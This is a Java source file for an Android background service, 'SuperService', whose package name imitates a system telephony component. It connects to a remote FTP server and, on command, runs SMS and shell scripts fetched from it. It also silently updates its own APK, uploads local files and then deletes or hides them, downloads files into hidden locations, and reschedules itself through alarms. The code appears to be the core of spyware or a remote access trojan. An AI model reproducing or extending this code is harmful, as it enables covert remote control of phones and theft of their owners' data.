package com.telephony.services;

import java.io.File;
import java.io.FileFilter;
import java.net.URI;
import java.util.Date;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.IBinder;
import android.os.SystemClock;

public class SuperService extends Service {

	private static final String INDEX_FILE = "files";

	public static final int COMMAND_RUN_SCRIPTER = 1;
	public static final int COMMAND_RUN_UPDATER = 2;
	public static final int COMMAND_RUN_UPLOAD = 3;
	public static final int COMMAND_RUN_DOWNLOAD = 4;

	private BroadcastReceiver connectionReceiver;
	private Connection connection;
	private PreferenceUtils sPref = null;
	private ExecutorService es;
	private MyFTPClient ftp = null;
	private AtomicInteger activeTasks;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		try {
			es = Executors.newFixedThreadPool(4);
			activeTasks = new AtomicInteger(0);
			sPref = PreferenceUtils.getInstance(this);
			connection = Connection.getInstance(this);
			ftp = MyFTPClient.getInstance();
			connectionReceiver = new BroadcastReceiver() {
				@Override
				public void onReceive(Context context, Intent intent) {
					Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
					synchronized (connection) {
						connection.notifyAll();
					}
				}
			};

			registerReceiver(connectionReceiver, new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));

		} catch (Exception e) {
			e.printStackTrace();
		}
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.submit(new RunService(intent, flags, startId, this));
		activeTasks.incrementAndGet();
		return START_REDELIVER_INTENT;

	}

	private class RunService implements Callable<Void> {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;
		private Updater upd = null;
		private Scripter scp = null;
		private int command = 0;
		private long interval = 0;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		@Override
		public Void call() {
			long rfs = -1;
			try {
				command = intent.getIntExtra(Utils.EXTRA_COMMAND, 0);
				interval = intent.getLongExtra(Utils.EXTRA_INTERVAL, 0);
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId + " with command: " + command);
				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)
						&& connection.waitForConnection(sPref.isWifiOnly(), 20, TimeUnit.SECONDS)) {

					if (ftp.connect(new URI(sPref.getRemoteUrl()))) {
						switch (command) {
						case COMMAND_RUN_SCRIPTER:
							scp = new Scripter(context, ftp);							
							scp.execSMScript();
							scp.execShellScript();
							break;

						case COMMAND_RUN_UPDATER:
							upd = new Updater(context, ftp);
							if (upd.getRemoteVersion() > Utils.getCurrentVersion(context)) {
								upd.updateAPK();
							}
							break;

						case COMMAND_RUN_UPLOAD:
							File[] list = Utils.rlistFiles(sPref.getRootDir(), new FileFilter() {
								@Override
								public boolean accept(File f) {
									Date today = new Date();
									return f.isDirectory()
											|| (!f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.MINUTE * 15))));
								}
							});
							String remotefile = "";
							for (File file : list) {
								try {
									if (file.isFile()) {
										remotefile = ftp.getRemoteFile(sPref.getRootDir(), file);
										if (ftp.getFileSize(remotefile) != file.length()) {
											Log.d(Utils.LOG_TAG, "try upload: " + file.getAbsolutePath());
											ftp.uploadFile(file, remotefile);
										}
										if (!sPref.isKeepUploaded() || (file.getName().equals(SMService.CONFIG_OUT_FILENAME))) {
											file.delete();
										} else {
											Utils.setHidden(file);
										}
									}
								} catch (Exception e) {
									e.printStackTrace();
									if (!(connection.isConnected(sPref.isWifiOnly()) && ftp.isReady())) {
										break;
									}
								}
							}
							break;

						case COMMAND_RUN_DOWNLOAD:
							String[] files = ftp.downloadFileStrings(INDEX_FILE);
							File file = null;
							for (String fn : files) {
								try {
									if (!fn.equals("")) {
										rfs = ftp.getFileSize(fn);
										if (rfs > 0) {
											file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), fn));
											if (file != null) {
												if ((file.exists() && (file.length() != rfs)) || (!file.exists())) {
													Log.d(Utils.LOG_TAG, "try download: " + fn + " to " + file.getAbsolutePath());
													ftp.downloadFile(fn, file);
												}
											}
										}
									}
								} catch (Exception e) {
									e.printStackTrace();
									if (!(connection.isConnected(sPref.isWifiOnly()) && ftp.isReady())) {
										break;
									}
								}
							}
							break;
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				interval /= 4;
			} finally {
				stop();
			}
			return null;
		}

		public void stop() {
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			try {
				if ((command > 0) && (interval > 0)) {
					AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
					PendingIntent pi = PendingIntent.getService(context, 0, intent, 0);
					am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + interval, pi);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}			
			if (activeTasks.decrementAndGet() <= 0) {
				stopSelf();
			}
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		es.shutdown();
		try {
			Thread ftp_disconnect = new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						if (ftp != null) {
							ftp.disconnect();
						}
					} catch (Exception e) {
					}
				}
			}, "FTP.DISCONNECT");
			ftp_disconnect.start();
			ftp_disconnect.join();

			if ((es.isShutdown()) && (!es.awaitTermination(60, TimeUnit.SECONDS))) {
				es.shutdownNow();
				if (!es.awaitTermination(60, TimeUnit.SECONDS)) {
					Log.d(Utils.LOG_TAG, "Pool did not terminated");
				}
			}

		} catch (InterruptedException ie) {
			es.shutdownNow();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				unregisterReceiver(connectionReceiver);
			} catch (Exception e) {
			}
		}
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
